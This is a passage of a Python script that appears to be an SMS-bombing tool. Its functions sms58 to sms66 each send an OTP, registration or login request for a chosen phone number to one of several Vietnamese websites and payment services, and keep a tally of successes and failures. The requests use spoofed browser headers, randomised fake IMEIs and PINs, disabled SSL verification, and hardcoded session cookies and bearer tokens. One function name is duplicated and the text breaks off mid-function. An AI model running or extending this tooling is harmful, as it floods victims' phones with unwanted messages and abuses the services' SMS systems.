        "Cookie": "_ga_LM3PQNHV6S=GS1.1.1683042907.1.0.1683042907.60.0.0; _gcl_au=1.1.888294803.1683042909; _ga_JLL9R732MK=GS1.1.1683042909.1.0.1683042909.0.0.0; _ga_FMXKZXNRJB=GS1.1.1683042909.1.0.1683042909.60.0.0; _hjSessionUser_3154488=eyJpZCI6IjFlZDBjZjEzLTk1NTYtNWFiYi1hNjZkLWVhYzZhMmJkYTljZCIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5NDYsImV4cCI6ZmFsc2V9; _hjFirstSeen=1; _hjIncludedInSessionSample_3154488=0; _hjSession_3154488=eyJpZCI6IjJlZmFjYjk2LWQ4NWEtNGY3NC1iYjdiLWEyMjRmNDQ5YzQ3YiIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5ODMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _gid=GA1.2.665729834.1683042910; _gat_gtag_UA_201462250_4=1; _gat_UA-222516876-1=1; _fbp=fb.1.1683042910188.410123624; _ga_T14T78MGX8=GS1.1.1683042910.1.0.1683042910.0.0.0; _ga=GA1.1.820789589.1683042908; _ga_5KHZV6MD4J=GS1.1.1683042915.1.0.1683042916.0.0.0; _ga=GA1.3.820789589.1683042908; _gid=GA1.3.665729834.1683042910; _gat_UA-213798897-3=1"
    }
    
    data = {
        "phone": phone,
        "challenge_code": "674b72a1c98013e2fb629e19236d592c466b3de750584c974bba31377c283c00",
        "challenge_method": "SHA256"
    }
    response = requests.post("https://id.icankid.vn/api/otp/challenge/", json=data, headers=headers)
    
    if response.ok:
        thanhcong+=1
    else:
        thatbai+=1
#sms 58
def sms58(phone):
    global thanhcong
    global thatbai
    headers = {
        "Host": "api.thitruongsi.com",
        "content-length": "641",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://m.thitruongsi.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.thitruongsi.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    data = {
        "account_phone": phone
    }
    url = "https://api.thitruongsi.com/v1/user/api/v4/users/register/step1-phone"
    response = requests.post(url, json=data, headers=headers, verify=False)
    # The 'verify=False' argument is used to ignore SSL certificate verification, but it is not recommended.
    # You should consider using a valid SSL certificate verification in production.

    if response.ok:
        thanhcong+=1
    else:
        thatbai+=1
#sms 59
def sms59(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_cfuvid': 'lDZgITpXJ8dt8dz1xxZJ2eO1jjTsLRNQz1EYGUtvHD8-1693616884672-0-604800000',
        'con.ses.id': 'cb51616e-d90e-4d43-afff-4a8d4090aaea',
        'cf_clearance': 'JADqfh9qf.B.5Cuwpq7ss3q8sD.kp6ycfPzybalacfk-1693616900-0-1-bd488ac1.a2c0bc88.ea49d521-250.2.1693616900',
        '_gid': 'GA1.3.455334370.1693616897',
        '_gat_gtag_UA_3729099_6': '1',
        '_gat_UA-3729099-1': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'ECEDsVw9uB_ZcsJoOLvv1Y0mgh3',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_1708983': '0',
        '_hjSession_1708983': 'eyJpZCI6IjAyZmM1ODM1LTcyNmQtNGViNC1hZjcwLTQwM2RkMTQ1NmNhNyIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODgsImluU2FtcGxlIjpmYWxzZX0=',
        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%229e211272-4290-4e80-a51d-792eb9dc3989%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037584Z%22%7D',
        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22452b0e1f-b525-4c00-b9f0-47fb464a55fb%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037858Z%22%7D',
        '_gcl_au': '1.1.716350485.1693616908',
        'desapp': 'sellernet01',
        'SERVERID': '53',
        '_ga': 'GA1.3.177629587.1693616897',
        '_hjSessionUser_1708983': 'eyJpZCI6IjFhYTZhNmIxLWNhNDgtNTJmNS05NmY2LTNjYTIzNzI3MzQ5MiIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODQsImV4aXN0aW5nIjp0cnVlfQ==',
        '__zi': '2000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLyncmFxoW0L1tccUzlJCG47POP_mzy84HDrlqFVmpGv0sJCsE0.1',
        'ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9': '%7B%22g%22%3A%224d8900df-674c-335e-950a-217f9fa7a2db%22%2C%22c%22%3A1693616925481%2C%22l%22%3A1693616925481%7D',
        '_ga_HTS298453C': 'GS1.1.1693616898.1.1.1693616926.32.0.0',
    }

    headers = {
        'authority': 'm.batdongsan.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        # 'cookie': '_cfuvid=lDZgITpXJ8dt8dz1xxZJ2eO1jjTsLRNQz1EYGUtvHD8-1693616884672-0-604800000; con.ses.id=cb51616e-d90e-4d43-afff-4a8d4090aaea; cf_clearance=JADqfh9qf.B.5Cuwpq7ss3q8sD.kp6ycfPzybalacfk-1693616900-0-1-bd488ac1.a2c0bc88.ea49d521-250.2.1693616900; _gid=GA1.3.455334370.1693616897; _gat_gtag_UA_3729099_6=1; _gat_UA-3729099-1=1; _tt_enable_cookie=1; _ttp=ECEDsVw9uB_ZcsJoOLvv1Y0mgh3; _hjFirstSeen=1; _hjIncludedInSessionSample_1708983=0; _hjSession_1708983=eyJpZCI6IjAyZmM1ODM1LTcyNmQtNGViNC1hZjcwLTQwM2RkMTQ1NmNhNyIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODgsImluU2FtcGxlIjpmYWxzZX0=; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%229e211272-4290-4e80-a51d-792eb9dc3989%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037584Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22452b0e1f-b525-4c00-b9f0-47fb464a55fb%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037858Z%22%7D; _gcl_au=1.1.716350485.1693616908; desapp=sellernet01; SERVERID=53; _ga=GA1.3.177629587.1693616897; _hjSessionUser_1708983=eyJpZCI6IjFhYTZhNmIxLWNhNDgtNTJmNS05NmY2LTNjYTIzNzI3MzQ5MiIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODQsImV4aXN0aW5nIjp0cnVlfQ==; __zi=2000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLyncmFxoW0L1tccUzlJCG47POP_mzy84HDrlqFVmpGv0sJCsE0.1; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%224d8900df-674c-335e-950a-217f9fa7a2db%22%2C%22c%22%3A1693616925481%2C%22l%22%3A1693616925481%7D; _ga_HTS298453C=GS1.1.1693616898.1.1.1693616926.32.0.0',
        'dnt': '1',
        'referer': 'https://m.batdongsan.com.vn/sellernet/trang-dang-ky',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'phoneNumber': phone,
    }

    response = requests.get(
        'https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
        params=params,
        cookies=cookies,
        headers=headers,
    )

    thanhcong+=1
#sms 61
def sms61(phone):
    global thanhcong
    global thatbai
    headers = {
        "Host": "api8.viettelpay.vn",
        "product": "VIETTELPAY",
        "accept-language": "vi",
        "authority-party": "APP",
        "channel": "APP",
        "type-os": "android",
        "app-version": "5.1.4",
        "os-version": "10",
        "imei": "VTP_" + generate_random_string(32),
        "x-request-id": "20230803164512",  # Replace with the current date and time in the format "YmdHis"
        "content-type": "application/json; charset=UTF-8",
        "user-agent": "okhttp/4.2.2"
    }

    data = {
        "type": "msisdn",
        "username": phone
    }

    response = requests.post("https://api8.viettelpay.vn/customer/v1/validate/account", json=data, headers=headers, verify=False)
    get_data = response.json()

    if get_data["status"]["code"] == "CS9901":
        data = {
            "hash": "",
            "identityType": "msisdn",
            "identityValue": phone,
            "imei": "VTP_" + generate_random_string(32),
            "notifyToken": "",
            "otp": "android",
            "pin": "VTP_" + generate_random_string(32),
            "transactionId": "",
            "type": "REGISTER",
            "typeOs": "android",
            "verifyMethod": "sms"
        }
        response = requests.post("https://api8.viettelpay.vn/customer/v2/accounts/register", json=data, headers=headers, verify=False)
        get_data = response.json()
    else:
        data = {
            "imei": "VTP_" + generate_random_string(32),
            "loginType": "BASIC",
            "msisdn": phone,
            "otp": "",
            "pin": "VTP_" + generate_random_string(32),
            "requestId": "",
            "typeOs": "android",
            "userType": "msisdn",
            "username": phone
        }
        response = requests.post("https://api8.viettelpay.vn/auth/v1/authn/login", json=data, headers=headers, verify=False)
        get_data = response.json()

    if "Cần xác thực bổ sung OTP" in get_data["status"]["message"] or "Vui lòng nhập mã OTP được gửi về SĐT " + phone + " để xác minh chính chủ" in get_data["status"]["message"]:
        thanhcong+=1
    else:
        thatbai+=1
def sms62(phone):
    global thanhcong
    global thatbai
    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'access-control-request-headers': 'content-type',
        'access-control-request-method': 'POST',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    response = requests.options('https://online-gateway.ghn.vn/sso/public-api/v2/client/checkexistphone', headers=headers)


    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
    if 'true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms63(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gcl_au': '1.1.612062991.1693832247',
        '_ga': 'GA1.2.2100968570.1693832247',
        '_gid': 'GA1.2.823438155.1693832247',
        '_tt_enable_cookie': '1',
        '_ttp': '8QojcD2E-4ZWQyk38eZM5QTGEw2',
        '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus',
        '.Nop.Customer': 'ba54ce0a-13e1-453c-8363-88bf017b8dcf',
        '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
    }

    headers = {
        'authority': 'thepizzacompany.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.612062991.1693832247; _ga=GA1.2.2100968570.1693832247; _gid=GA1.2.823438155.1693832247; _tt_enable_cookie=1; _ttp=8QojcD2E-4ZWQyk38eZM5QTGEw2; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus; .Nop.Customer=ba54ce0a-13e1-453c-8363-88bf017b8dcf; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
        'dnt': '1',
        'origin': 'https://thepizzacompany.vn',
        'referer': 'https://thepizzacompany.vn/Otp',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdA6eKbtod3RRZhW0oMAbjY51WN7NObT74BSrixWfCNutY-oIWf45xqyHeDAqa6uoqs1jgc1YTZb9K75G_VbjoHC5Tpa6zerOu5KrKhCjOuHPKVnuUfgka_VUVi1RwMXbg',
    }

    response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data)
    if 'true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms63(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gcl_au': '1.1.711512360.1693834205',
        '_gid': 'GA1.2.199431095.1693834206',
        '_gat_UA-78703708-2': '1',
        '_ga': 'GA1.1.1951783867.1693834206',
        '_ga_P138SCK22P': 'GS1.1.1693834206.1.1.1693834218.48.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_gcl_au=1.1.711512360.1693834205; _gid=GA1.2.199431095.1693834206; _gat_UA-78703708-2=1; _ga=GA1.1.1951783867.1693834206; _ga_P138SCK22P=GS1.1.1693834206.1.1.1693834218.48.0.0',
        'DNT': '1',
        'Origin': 'https://shopiness.vn',
        'Referer': 'https://shopiness.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'action': 'verify-registration-info',
        'phoneNumber': phone,
        'refCode': '',
    }

    response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data)
    if '0' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms64(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gid': 'GA1.2.1244101125.1693834335',
        '_gat_gtag_UA_74938948_3': '1',
        '_ga_SQM4TCSQGX': 'GS1.1.1693834338.1.0.1693834338.0.0.0',
        'pay_session': 'eyJpdiI6ImEybE9qZ1hESXZ3K2tnSjlZcjBvRlE9PSIsInZhbHVlIjoiTmlKbkFUSkdqT21LYXVFYWNVblhcL2hjeXFcLytScTk4aUVsT29NZ1NOajRLQXp2UEYyMFRoNVwvcVlUNjM2M25Yc0xmcVJHS1lNTWZSWE51ZGY4TWNlcXc9PSIsIm1hYyI6IjZhY2FhMjFkNDY5YWRjMDE3ODJjMGQwOTZiOGQ0Nzk2ODhmMjllOTFlODhlZGJhODgyMjY2OWU2MTljMGExZjcifQ%3D%3D',
        '_ga': 'GA1.2.2046227800.1693834335',
        '_gat': '1',
        '_ga_8W5EGNGFDP': 'GS1.2.1693834356.1.0.1693834356.0.0.0',
    }

    headers = {
        'authority': 'vi.appota.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gid=GA1.2.1244101125.1693834335; _gat_gtag_UA_74938948_3=1; _ga_SQM4TCSQGX=GS1.1.1693834338.1.0.1693834338.0.0.0; pay_session=eyJpdiI6ImEybE9qZ1hESXZ3K2tnSjlZcjBvRlE9PSIsInZhbHVlIjoiTmlKbkFUSkdqT21LYXVFYWNVblhcL2hjeXFcLytScTk4aUVsT29NZ1NOajRLQXp2UEYyMFRoNVwvcVlUNjM2M25Yc0xmcVJHS1lNTWZSWE51ZGY4TWNlcXc9PSIsIm1hYyI6IjZhY2FhMjFkNDY5YWRjMDE3ODJjMGQwOTZiOGQ0Nzk2ODhmMjllOTFlODhlZGJhODgyMjY2OWU2MTljMGExZjcifQ%3D%3D; _ga=GA1.2.2046227800.1693834335; _gat=1; _ga_8W5EGNGFDP=GS1.2.1693834356.1.0.1693834356.0.0.0',
        'dnt': '1',
        'origin': 'https://vi.appota.com',
        'referer': 'https://vi.appota.com/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone_number': phone,
    }

    response = requests.post('https://vi.appota.com/check-phone-register.html', cookies=cookies, headers=headers, data=data)
    if 'true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms65(phone):
    global thanhcong
    global thatbai
    cookies = {
        'ubo_trade': '%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D',
        'ubo_token': 'Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjUzNzE3OTgsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.N3noyNsY-pzILfGkST6jjxt1kkAxwIAuBPKEwjxZvQDmGPUDBQSnFObrxuc5dx9NNcWqHad52iQUfmaLMJz1tk3MZ0G0PNzxa7-TQ7dMPYo7DoMVWKQJRlvB6Zn16Dfsy-PM1cegNOOkw5BpQp52B9Kc1otqIPTvyxxUGgZ4wBNC7c8cPfkGqT-yDeRHLRFQ1exsl-m7hYEC6Ng59OQredrFZe1N2v5V5mbkc-0E-du8XQO8eHZ8tvRAGrbIYKY5-l1XaA5OXHaWOrmBdpt4p9mb9S-mAujuv_YNmKQZB0s4T4sR219IHbtjNx7wrNx7g5ZoJTPXCrh1vyGH28T2L6ZLz8ZJMe3nIpb70RfybSyO66U3u8c76MIMYgBYcn9OpETdkvNqK5NtgKcJlAB2RxWkLb2hLSXSfFG7UKo637nL3G4dZwTxtEY9OMM2b_pbWZXOMMx5L3OkQ1jOew4rWM-PozEZafA1H4M5u6Kdd3NM0g0iXiGFVP1PR9AkqxLWmWLwhP00IWCiiHs9zRc9F5exw7HdqS4wAIG5mkcJmhg9RMPMSuFxYivWDKLY2FQLWa0FSHrmZq19dwMjoMIv1eFaDB3UeHgAaw3UFJG5-v9WPFS3sHPzxl21szqTJnf3emOy2PbOgXOy-Xw_F6w3IOAI5vUztt8Gh3tLDG26eyM',
        '_gcl_au': '1.1.162144353.1693835804',
        '_ga': 'GA1.1.1946112064.1693835805',
        '_ga_KCGG79N4SY': 'GS1.1.1693835804.1.0.1693835804.0.0.0',
        '_tt_enable_cookie': '1',
        '_ttp': 'uevKXACqy1ibyejtH3u43pdFP34',
        '_ga_3PKTQRQF3P': 'GS1.1.1693835805.1.0.1693835808.57.0.0',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjUzNzE3OTgsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.N3noyNsY-pzILfGkST6jjxt1kkAxwIAuBPKEwjxZvQDmGPUDBQSnFObrxuc5dx9NNcWqHad52iQUfmaLMJz1tk3MZ0G0PNzxa7-TQ7dMPYo7DoMVWKQJRlvB6Zn16Dfsy-PM1cegNOOkw5BpQp52B9Kc1otqIPTvyxxUGgZ4wBNC7c8cPfkGqT-yDeRHLRFQ1exsl-m7hYEC6Ng59OQredrFZe1N2v5V5mbkc-0E-du8XQO8eHZ8tvRAGrbIYKY5-l1XaA5OXHaWOrmBdpt4p9mb9S-mAujuv_YNmKQZB0s4T4sR219IHbtjNx7wrNx7g5ZoJTPXCrh1vyGH28T2L6ZLz8ZJMe3nIpb70RfybSyO66U3u8c76MIMYgBYcn9OpETdkvNqK5NtgKcJlAB2RxWkLb2hLSXSfFG7UKo637nL3G4dZwTxtEY9OMM2b_pbWZXOMMx5L3OkQ1jOew4rWM-PozEZafA1H4M5u6Kdd3NM0g0iXiGFVP1PR9AkqxLWmWLwhP00IWCiiHs9zRc9F5exw7HdqS4wAIG5mkcJmhg9RMPMSuFxYivWDKLY2FQLWa0FSHrmZq19dwMjoMIv1eFaDB3UeHgAaw3UFJG5-v9WPFS3sHPzxl21szqTJnf3emOy2PbOgXOy-Xw_F6w3IOAI5vUztt8Gh3tLDG26eyM',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjUzNzE3OTgsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.N3noyNsY-pzILfGkST6jjxt1kkAxwIAuBPKEwjxZvQDmGPUDBQSnFObrxuc5dx9NNcWqHad52iQUfmaLMJz1tk3MZ0G0PNzxa7-TQ7dMPYo7DoMVWKQJRlvB6Zn16Dfsy-PM1cegNOOkw5BpQp52B9Kc1otqIPTvyxxUGgZ4wBNC7c8cPfkGqT-yDeRHLRFQ1exsl-m7hYEC6Ng59OQredrFZe1N2v5V5mbkc-0E-du8XQO8eHZ8tvRAGrbIYKY5-l1XaA5OXHaWOrmBdpt4p9mb9S-mAujuv_YNmKQZB0s4T4sR219IHbtjNx7wrNx7g5ZoJTPXCrh1vyGH28T2L6ZLz8ZJMe3nIpb70RfybSyO66U3u8c76MIMYgBYcn9OpETdkvNqK5NtgKcJlAB2RxWkLb2hLSXSfFG7UKo637nL3G4dZwTxtEY9OMM2b_pbWZXOMMx5L3OkQ1jOew4rWM-PozEZafA1H4M5u6Kdd3NM0g0iXiGFVP1PR9AkqxLWmWLwhP00IWCiiHs9zRc9F5exw7HdqS4wAIG5mkcJmhg9RMPMSuFxYivWDKLY2FQLWa0FSHrmZq19dwMjoMIv1eFaDB3UeHgAaw3UFJG5-v9WPFS3sHPzxl21szqTJnf3emOy2PbOgXOy-Xw_F6w3IOAI5vUztt8Gh3tLDG26eyM; _gcl_au=1.1.162144353.1693835804; _ga=GA1.1.1946112064.1693835805; _ga_KCGG79N4SY=GS1.1.1693835804.1.0.1693835804.0.0.0; _tt_enable_cookie=1; _ttp=uevKXACqy1ibyejtH3u43pdFP34; _ga_3PKTQRQF3P=GS1.1.1693835805.1.0.1693835808.57.0.0',
        'DNT': '1',
        'Origin': 'https://ubofood.com',
        'Referer': 'https://ubofood.com/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = '{"phone_number":'+phone+',"trade_code":"379760000"}'

    response = requests.post('https://ubofood.com/api/v1/account/customers/register', cookies=cookies, headers=headers, data=data)
    if 'true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms66(phone):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://www.tiencash.com',
        'Referer': 'https://www.tiencash.com/',
        'Sec-Fetch-Dest': 'empty',
